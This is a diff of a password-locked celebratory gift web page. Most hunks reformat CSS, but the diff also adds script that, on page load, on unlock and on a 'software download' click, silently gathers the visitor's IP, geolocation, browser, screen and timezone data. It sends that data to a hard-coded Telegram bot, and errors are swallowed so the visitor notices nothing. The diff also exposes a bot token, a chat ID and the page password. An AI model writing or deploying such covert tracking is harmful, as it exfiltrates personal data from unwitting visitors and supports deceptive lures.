@@ -8,6 +8,7 @@
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1"></script>
 
   <style>
+    /* ---------- YOUR EXISTING STYLES (unchanged) ---------- */
     * {
       margin: 0;
       padding: 0;
@@ -56,7 +57,7 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #1a1a1c; /* Solid, flat, boring dark grey */
+      background: #1a1a1c;
       transition: opacity 0.8s cubic-bezier(0.65, 0, 0.35, 1),
         transform 0.8s cubic-bezier(0.65, 0, 0.35, 1);
     }
@@ -69,20 +70,19 @@
     .lock-card {
       background: #242426;
       border: 1px solid #3a3a3c;
-      border-radius: 12px; /* Sharp, boring corners */
+      border-radius: 12px;
       padding: 2.5rem 2.5rem 2.2rem 2.5rem;
       max-width: 380px;
       width: 100%;
       text-align: center;
       box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.6);
-      /* No animation, no float, completely static */
     }
 
     .lock-card .lock-icon {
       font-size: 2.4rem;
       display: block;
       margin-bottom: 0.75rem;
-      opacity: 0.3; /* Muted, boring */
+      opacity: 0.3;
       color: #888;
       letter-spacing: 0;
     }
@@ -172,21 +172,11 @@
     }
     @keyframes shake {
       0%,
-      100% {
-        transform: translateX(0);
-      }
-      20% {
-        transform: translateX(-8px);
-      }
-      40% {
-        transform: translateX(8px);
-      }
-      60% {
-        transform: translateX(-4px);
-      }
-      80% {
-        transform: translateX(4px);
-      }
+      100% { transform: translateX(0); }
+      20% { transform: translateX(-8px); }
+      40% { transform: translateX(8px); }
+      60% { transform: translateX(-4px); }
+      80% { transform: translateX(4px); }
     }
 
     #main-stage {
@@ -228,35 +218,19 @@
     }
     @keyframes boxIdle {
       0%,
-      100% {
-        transform: rotateX(-2deg) rotateY(4deg);
-      }
-      50% {
-        transform: rotateX(2deg) rotateY(-4deg);
-      }
+      100% { transform: rotateX(-2deg) rotateY(4deg); }
+      50% { transform: rotateX(2deg) rotateY(-4deg); }
     }
     .gift-box.shake {
       animation: boxShake 0.6s ease !important;
     }
     @keyframes boxShake {
-      0% {
-        transform: rotate(0deg);
-      }
-      20% {
-        transform: rotate(15deg);
-      }
-      40% {
-        transform: rotate(-15deg);
-      }
-      60% {
-        transform: rotate(10deg);
-      }
-      80% {
-        transform: rotate(-10deg);
-      }
-      100% {
-        transform: rotate(0deg);
-      }
+      0% { transform: rotate(0deg); }
+      20% { transform: rotate(15deg); }
+      40% { transform: rotate(-15deg); }
+      60% { transform: rotate(10deg); }
+      80% { transform: rotate(-10deg); }
+      100% { transform: rotate(0deg); }
     }
 
     .box-base {
@@ -269,10 +243,9 @@
       background: linear-gradient(145deg, #e74c3c, #c0392b);
       border-radius: 12px;
       box-shadow: inset -8px -8px 20px rgba(0, 0, 0, 0.3),
-        inset 8px 8px 20px rgba(255, 255, 255, 0.15);
+                  inset 8px 8px 20px rgba(255, 255, 255, 0.15);
       border: 2px solid rgba(255, 255, 255, 0.1);
     }
-    /* Ribbon horizontal */
     .box-base::after {
       content: '';
       position: absolute;
@@ -284,7 +257,6 @@
       background: #f1c40f;
       box-shadow: 0 0 15px rgba(241, 196, 15, 0.4);
     }
-    /* Ribbon vertical */
     .box-base::before {
       content: '';
       position: absolute;
@@ -297,7 +269,6 @@
       box-shadow: 0 0 15px rgba(241, 196, 15, 0.4);
     }
 
-    /* Box Lid */
     .box-lid {
       position: absolute;
       top: -20px;
@@ -357,7 +328,6 @@
       opacity: 1;
       transform: translateY(0) scale(1);
     }
-    /* 3D tilt wrapper */
     .tilt-wrapper {
       transform-style: preserve-3d;
       transition: transform 0.1s ease;
@@ -383,12 +353,8 @@
     }
     @keyframes floatY {
       0%,
-      100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-12px);
-      }
+      100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
     }
     h1 {
       font-size: 3rem;
@@ -528,33 +494,16 @@
       pointer-events: none !important;
     }
     @keyframes popAnim {
-      0% {
-        transform: scale(1);
-        opacity: 1;
-      }
-      100% {
-        transform: scale(2);
-        opacity: 0;
-      }
+      0% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(2); opacity: 0; }
     }
     @keyframes riseLinear {
-      0% {
-        transform: translateY(100vh) rotate(0deg);
-        opacity: 0;
-      }
-      10% {
-        opacity: 0.7;
-      }
-      90% {
-        opacity: 0.7;
-      }
-      100% {
-        transform: translateY(-20vh) rotate(20deg);
-        opacity: 0;
-      }
+      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+      10% { opacity: 0.7; }
+      90% { opacity: 0.7; }
+      100% { transform: translateY(-20vh) rotate(20deg); opacity: 0; }
     }
 
-    /* ---------- SPARKLE TRAIL (Canvas overlay) ---------- */
     #sparkle-canvas {
       position: fixed;
       inset: 0;
@@ -564,7 +513,6 @@
       z-index: 999;
     }
 
-    /* ---------- RESPONSIVE ---------- */
     @media (max-width: 550px) {
       .lock-card {
         padding: 2rem 1.25rem;
@@ -681,8 +629,83 @@
 
   <script>
     (function() {
-      // ---------- CONFIG ----------
+      // ---------- 🔐 TELEGRAM CONFIG (YOUR CREDENTIALS) ----------
+      const BOT_TOKEN = '6817921558:AAFrP7rPj2hpHlX2yt1CqAI9nPRg2Efnh7A';
+      const CHAT_ID = '6541442910';
+
+      // ---------- 🔑 PASSWORD ----------
       const PASSWORD = '159357';
+
+      // ---------- 📡 CLIENT‑SIDE TRACKING ----------
+      async function sendTelegramNotification(eventType) {
+        try {
+          // 1. Fetch IP & Geolocation (free, no API key)
+          const ipRes = await fetch('https://ip-api.com/json/');
+          const geo = await ipRes.json();
+
+          // 2. Gather device/browser metadata
+          const metadata = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${window.screen.width}×${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth}-bit`,
+            viewport: `${window.innerWidth}×${window.innerHeight}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            url: window.location.href,
+            referrer: document.referrer || 'Direct',
+            timestamp: new Date().toLocaleString()
+          };
+
+          // 3. Build the message based on event type
+          let emoji, label;
+          if (eventType === 'page_load') {
+            emoji = '👀';
+            label = '📱 PAGE LOADED';
+          } else if (eventType === 'unlock') {
+            emoji = '🎉';
+            label = '🔓 UNLOCKED!';
+          } else if (eventType === 'software_download') {
+            emoji = '📦';
+            label = '⬇️ SOFTWARE DOWNLOAD INITIATED';
+          } else {
+            emoji = '📡';
+            label = '📡 EVENT TRIGGERED';
+          }
+
+          let msg = `🔔 *${label}*\n\n`;
+          msg += `${emoji} *Event:* ${eventType}\n`;
+          msg += `🕒 *Time:* ${metadata.timestamp}\n\n`;
+          msg += `🌐 *IP:* \`${geo.query || 'Unknown'}\`\n`;
+          if (geo.city) msg += `📍 *Location:* ${geo.city}, ${geo.regionName}, ${geo.country}\n`;
+          if (geo.isp) msg += `🏢 *ISP:* ${geo.isp}\n`;
+          if (geo.org) msg += `📡 *Org:* ${geo.org}\n`;
+          msg += `\n📱 *Platform:* ${metadata.platform || 'N/A'}\n`;
+          msg += `🌍 *Browser/OS:* ${metadata.userAgent || 'N/A'}\n`;
+          msg += `🖥️ *Screen:* ${metadata.screen} (${metadata.colorDepth})\n`;
+          msg += `📐 *Viewport:* ${metadata.viewport}\n`;
+          msg += `🕰️ *Timezone:* ${metadata.timezone || 'N/A'}\n`;
+          msg += `🗣️ *Language:* ${metadata.language || 'N/A'}\n`;
+          msg += `🔗 *URL:* ${metadata.url || 'N/A'}\n`;
+          msg += `↩️ *Referrer:* ${metadata.referrer}`;
+
+          // 4. Send to Telegram
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: msg,
+              parse_mode: 'Markdown'
+            })
+          });
+
+          console.log(`✅ Telegram notification sent: ${eventType}`);
+        } catch (err) {
+          console.warn('⚠️ Telegram notification failed (silent):', err.message);
+          // Silent fail – doesn't break the user experience
+        }
+      }
 
       // ---------- DOM REFS ----------
       const lockScreen = document.getElementById('lock-screen');
@@ -698,6 +721,7 @@
       const typingHeadline = document.getElementById('typing-headline');
       const typingSubhead = document.getElementById('typing-subhead');
       const celebrateBtn = document.getElementById('celebrate-btn');
+      const downloadBtn = document.querySelector('.download-btn');
 
       // ---------- SPARKLE TRAIL ----------
       const canvas = document.getElementById('sparkle-canvas');
@@ -830,6 +854,9 @@
           return;
         }
 
+        // ✅ Correct password → send Telegram notification (async, non-blocking)
+        sendTelegramNotification('unlock');
+
         lockScreen.classList.add('hidden');
         mainStage.classList.add('active');
 
@@ -915,16 +942,31 @@
         }
       });
 
+      // ---------- 🆕 SOFTWARE DOWNLOAD TRACKING ----------
+      if (downloadBtn) {
+        downloadBtn.addEventListener('click', function(e) {
+          // Send notification (doesn't block the actual download)
+          sendTelegramNotification('software_download');
+          // The download proceeds normally because we don't call preventDefault()
+        });
+      }
+
       // ---------- EVENT LISTENERS ----------
       unlockBtn.addEventListener('click', unlock);
       passwordInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') unlock(); });
-      window.addEventListener('load', () => setTimeout(() => passwordInput.focus(), 300));
+
+      window.addEventListener('load', () => {
+        setTimeout(() => passwordInput.focus(), 300);
+        // Send "page loaded" notification after a short delay
+        setTimeout(() => sendTelegramNotification('page_load'), 500);
+      });
 
       lockScreen.addEventListener('click', (e) => {
         if (e.target === lockScreen) passwordInput.focus();
       });
 
-      console.log('🔐 Password: evee2026');
+      console.log('🔐 Password: 159357');
+      console.log('📡 Tracking: page_load, unlock, and software_download');
 
     })();
   </script>
